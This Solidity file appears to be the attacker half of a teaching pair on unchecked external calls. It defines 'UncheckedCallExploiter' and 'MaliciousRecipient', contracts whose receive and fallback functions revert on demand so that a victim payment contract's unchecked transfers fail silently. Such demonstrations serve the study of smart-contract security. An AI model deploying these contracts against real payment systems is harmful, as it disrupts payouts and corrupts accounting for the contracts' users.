// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Attacker Contract: UncheckedCallExploiter
// This contract exploits the unchecked external call vulnerability
// by rejecting payments, causing silent failures in the victim contract.

import "./SC06_Unchecked_External_Calls_Victim.sol";

contract UncheckedCallExploiter {
    PaymentProcessor public vulnerableContract;
    bool public rejectPayments = true;
    uint256 public receivedAmount = 0;
    
    event PaymentRejected(address sender, uint256 amount);
    event PaymentAccepted(address sender, uint256 amount);

    constructor(address payable vulnerableContractAddress) {
        vulnerableContract = PaymentProcessor(vulnerableContractAddress);
    }

    // Toggle payment rejection
    function setRejectPayments(bool _reject) external {
        rejectPayments = _reject;
    }

    // Attack 1: Cause silent failure by rejecting payment
    // When rejectPayments is true, this contract will revert on receiving ETH
    receive() external payable {
        if (rejectPayments) {
            emit PaymentRejected(msg.sender, msg.value);
            revert("Payment rejected");
        } else {
            receivedAmount += msg.value;
            emit PaymentAccepted(msg.sender, msg.value);
        }
    }

    // Fallback function also rejects if rejectPayments is true
    fallback() external payable {
        if (rejectPayments) {
            emit PaymentRejected(msg.sender, msg.value);
            revert("Call rejected");
        } else {
            receivedAmount += msg.value;
            emit PaymentAccepted(msg.sender, msg.value);
        }
    }

    // Check received amount
    function getReceivedAmount() external view returns (uint256) {
        return receivedAmount;
    }

    // Check contract balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// Helper contract: Another malicious recipient
contract MaliciousRecipient {
    bool public shouldReject;
    
    constructor(bool _shouldReject) {
        shouldReject = _shouldReject;
    }
    
    receive() external payable {
        if (shouldReject) {
            revert("Payment refused");
        }
    }
}
